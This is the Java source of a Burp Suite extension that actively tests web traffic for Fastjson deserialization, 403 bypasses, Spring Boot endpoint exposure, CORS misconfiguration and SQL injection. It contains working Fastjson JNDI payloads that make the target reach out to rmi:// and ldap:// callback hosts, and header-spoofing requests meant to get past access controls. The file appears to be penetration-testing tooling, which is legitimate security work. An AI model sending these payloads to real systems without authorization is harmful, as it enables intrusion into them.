import burp.api.montoya.MontoyaApi;
import burp.api.montoya.collaborator.*;
import burp.api.montoya.http.handler.*;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;

import java.net.MalformedURLException;
import java.util.*;

public class MyHttpHandler implements HttpHandler {
    private final MontoyaApi montoyaApi;
    private final MyTableModel tableModel;
    private final ConfigModel configModel;

    private int id = 1;
    List<String> fastjsonPayload = new ArrayList<>(List.of(
            "{\"axin\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
            "{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://fast.%s/aaa\",\"autoCommit\":true}}",
            "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://fast.%s/aaa\",\"autoCommit\":true}"
    ));
    List<String> fastjsonPayloadError = new ArrayList<>(List.of(
            "{\"@type\": \"java.lang.AutoCloseable\"",
            "[\"test\":1]"
    ));

    public MyHttpHandler(MontoyaApi montoyaApi, MyTableModel tableModel, ConfigModel configModel) {
        this.montoyaApi = montoyaApi;
        this.tableModel = tableModel;
        this.configModel = configModel; // 初始化配置模型
    }

    @Override
    public RequestToBeSentAction handleHttpRequestToBeSent(HttpRequestToBeSent requestToBeSent) {
        return RequestToBeSentAction.continueWith(requestToBeSent);
    }

    @Override
    public ResponseReceivedAction handleHttpResponseReceived(HttpResponseReceived responseReceived) throws InterruptedException {
        boolean bypass403Enabled = configModel.isBypass403Enabled();
        boolean fastjsonEnabled = configModel.isFastjsonEnabled();
        boolean springbootEnables  = configModel.isspringbootEnabled();
        boolean corsEnabled = configModel.isCorsEnabled();
        boolean juniorSqlEnabled = configModel.isJuniorSqlEnabled();

        if (bypass403Enabled) {
            handleBypass403(responseReceived);
        }

        if (fastjsonEnabled) {
            handleFastJsonVulnerabilityDetection(responseReceived);
        }
        if (springbootEnables) {
            handleSpringBootVulnerabilityDetection(responseReceived);
        }
        if (corsEnabled) {
            handleCors(responseReceived);
        }
        if (juniorSqlEnabled) {
            handleSQLInjectionVulnerabilityDetection(responseReceived);
        }

        return null;
    }

    private void handleBypass403(HttpResponseReceived responseReceived) {
        if(MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
            HttpRequest firstHttpRequest = responseReceived.initiatingRequest();
            HttpResponse firstResponse = montoyaApi.http().sendRequest(firstHttpRequest).response();
            if (firstResponse.statusCode() == 403) {
                int firstLength = firstResponse.body().length();
                HttpRequest modifiedRequest = firstHttpRequest
                        .withAddedHeader("X-Forwarded-For", "127.0.0.1")
                        .withAddedHeader("X-Originating-IP", "127.0.0.1")
                        .withAddedHeader("X-Remote-IP", "127.0.0.1")
                        .withAddedHeader("X-Remote-Addr", "127.0.0.1")
                        .withAddedHeader("X-Forwarded-Proto", "http")
                        .withAddedHeader("X-Forwarded-Host", "127.0.0.1");

                HttpResponse twiceResponse = montoyaApi.http().sendRequest(modifiedRequest).response();


                int twiceLength = twiceResponse.body().length();

                if (twiceLength != firstLength && twiceResponse.statusCode() != 403) {
                    tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "403 bypass", twiceLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, twiceResponse), modifiedRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), twiceResponse.statusCode()));
                    id++;
                }
            }
        }
    }

    private void handleFastJsonVulnerabilityDetection(HttpResponseReceived responseReceived) {
        new Thread(() -> {
            try {
                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
                    HttpRequest initHttpRequest = responseReceived.initiatingRequest();
                    String body = initHttpRequest.body().toString();
                    if (body != null && body.length() > 0 && strMatch(body, "json")) {
                        detectFastJsonVulnerability(initHttpRequest, responseReceived);
                    }
                }
            } catch (Exception e) {
                // 异常处理
                montoyaApi.logging().logToOutput("FastJSON检测线程发生错误：" + e.getMessage());
            }
        }).start();
    }

    private void detectFastJsonVulnerability(HttpRequest initHttpRequest, HttpResponseReceived responseReceived) throws InterruptedException {
        int modifiedLength = 0;


        // FASTJSON检测逻辑，使用协作器检测
        CollaboratorClient collaboratorClient = montoyaApi.collaborator().createClient();

        for (String payload : fastjsonPayload) {
            HttpResponse modifiedResponse = null;
            HttpRequest modifiedRequest = null;
            String dnsDomain = collaboratorClient.generatePayload().toString();
            String formatPayload = String.format(payload, dnsDomain);

            modifiedRequest = initHttpRequest.withBody(formatPayload);
            modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
            modifiedLength = modifiedResponse.body().length();

            Thread.sleep(2000);


            List<Interaction> interactions = collaboratorClient.getInteractions(InteractionFilter.interactionPayloadFilter(dnsDomain));
            if (interactions != null && !interactions.isEmpty()) {
                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "FastJson Vul", modifiedLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, modifiedResponse), initHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), modifiedResponse.statusCode()));
                id++;
                break;
            }
        }

        // 尝试检测版本信息
        for (String payloadError : fastjsonPayloadError) {
            HttpResponse modifiedResponse = null;
            HttpRequest modifiedRequest = null;
            modifiedRequest = initHttpRequest.withBody(payloadError);
            modifiedResponse = montoyaApi.http().sendRequest(modifiedRequest).response();
            modifiedLength = modifiedResponse.body().length();

            if (modifiedResponse.bodyToString().contains("Version") || modifiedResponse.bodyToString().contains("1.2.")) {
                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find FastJson Version,Please Try More", modifiedLength, HttpRequestResponse.httpRequestResponse(modifiedRequest, modifiedResponse), initHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), modifiedResponse.statusCode()));
                id++;
                break;
            }
        }
    }

     //探测Springboot的线程
    private void handleSpringBootVulnerabilityDetection(HttpResponseReceived responseReceived) {
        new Thread(() -> {
            try {
                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
                    detectFastJsonVulnerability(responseReceived);
                }
            } catch (Exception e) {
                // 异常处理
                montoyaApi.logging().logToOutput("SpringBoot检测线程发生错误：" + e.getMessage());
            }
        }).start();

    }
    //springboot检测
    private void detectFastJsonVulnerability(HttpResponseReceived responseReceived) throws MalformedURLException, InterruptedException {
        HttpRequest httpRequest = responseReceived.initiatingRequest();
        //HttpResponse httpResponse = montoyaApi.http().sendRequest(httpRequest).response();
        String url = httpRequest.url();
        // 使用 java.net.URL 类来解析 URL
        java.net.URL parsedUrl = new java.net.URL(url);
        // 构建基本路径：协议 + 主机 + 端口 + 路径的起始
        int port = parsedUrl.getPort();
        String baseUrl = null;
        if (port == -1) {
            baseUrl = parsedUrl.getProtocol() + "://" + parsedUrl.getHost() +"/";
        }else {
            baseUrl = parsedUrl.getProtocol() + "://" + parsedUrl.getHost() + ":" + port + "/";
        }


        //探测是否为SpringBoot框架
        SpringBootScan springBootScan = new SpringBootScan(baseUrl,httpRequest,montoyaApi);
        boolean isIcoOfSpring = springBootScan.getIcoHash();
        boolean pathError = springBootScan.getPathError();


        //如果检测到SpringBoot，进行下一步探测
        if (isIcoOfSpring || pathError) {
            //montoyaApi.logging().logToOutput("检测到Spring Boot");
            HashMap<HttpRequest, HttpResponse> pathRequestReponse = springBootScan.startPathScan();
            if (pathRequestReponse != null && !pathRequestReponse.isEmpty()) {
                for (Map.Entry<HttpRequest, HttpResponse> entry : pathRequestReponse.entrySet()) {
                    HttpRequest request = entry.getKey();
                    HttpResponse response = entry.getValue();
                    int length = response.body().length();
                    tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find SpringBoot Path", length, HttpRequestResponse.httpRequestResponse(request, response), request.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), response.statusCode()));
                    id++;
                }
            }

        }
    }

    private void handleCors(HttpResponseReceived responseReceived) {
        HttpRequest corsHttpRequest = responseReceived.initiatingRequest();
        corsHttpRequest.withHeader("Origin", "*");
        HttpResponse corsResponse = montoyaApi.http().sendRequest(corsHttpRequest).response();
        //corsHttpRequest.with
        int length = corsResponse.body().length();
        if(corsResponse.statusCode() == 200 && corsResponse.hasHeader("Access-Control-Allow-Origin","*") && corsResponse.hasHeader("Access-Control-Allow-Credentials","*")){
            tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "Find SpringBoot Path", length, HttpRequestResponse.httpRequestResponse(corsHttpRequest, corsResponse), corsHttpRequest.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), corsResponse.statusCode()));
            id++;
        }
    }

    private void handleSQLInjectionVulnerabilityDetection(HttpResponseReceived responseReceived) {
        new Thread(() -> {
            try {
                if (MyFilterRequest.fromProxy(responseReceived) || MyFilterRequest.fromRepeater(responseReceived)) {
                    detectSQLInjectionVulnerability(responseReceived);
                }
            } catch (Exception e) {
                // 异常处理
                montoyaApi.logging().logToOutput("SQLInjection检测线程发生错误：" + e.getMessage());
            }
        }).start();

    }
    private void detectSQLInjectionVulnerability(HttpResponseReceived responseReceived) throws InterruptedException {
        HttpRequest httpRequest = responseReceived.initiatingRequest();
        String baseUrl = httpRequest.url();

        //发送原始请求，获取最初长度用于之后长度对比
        //HttpResponse onceResponse = montoyaApi.http().sendRequest(httpRequest).response();
        //int onceLength = onceResponse.bodyToString().length();

        JuniorSqlDetection juniorSqlDetection = new JuniorSqlDetection(baseUrl,httpRequest,montoyaApi);
        HashMap<HttpRequest, HttpResponse> SqlRequestReponse = juniorSqlDetection.SqlDetection();

        if (SqlRequestReponse != null && !SqlRequestReponse.isEmpty()) {
            for (Map.Entry<HttpRequest, HttpResponse> entry : SqlRequestReponse.entrySet()) {

                HttpRequest request = entry.getKey();
                HttpResponse response = entry.getValue();
                int length = response.body().length();

                //montoyaApi.logging().logToOutput(getLengthDiff(request));
                String lengthDiff = getLengthDiff(request);

                tableModel.add(new SourceLogEntry(id, responseReceived.toolSource().toolType().toolName(), null, "SQL ERROR, Len Change: "+lengthDiff, length, HttpRequestResponse.httpRequestResponse(request, response), request.httpService().toString(), responseReceived.initiatingRequest().pathWithoutQuery(), response.statusCode()));
                id++;
            }
        }
    }


    public static boolean strMatch(String str, String pattern) {
        if ("json".equals(pattern)) {
            return str.contains("{") && str.contains("}");
        }
        return false;
    }
    public static String getLengthDiff(HttpRequest request) {
        return request.headerValue("X-Length-Diff");
    }
}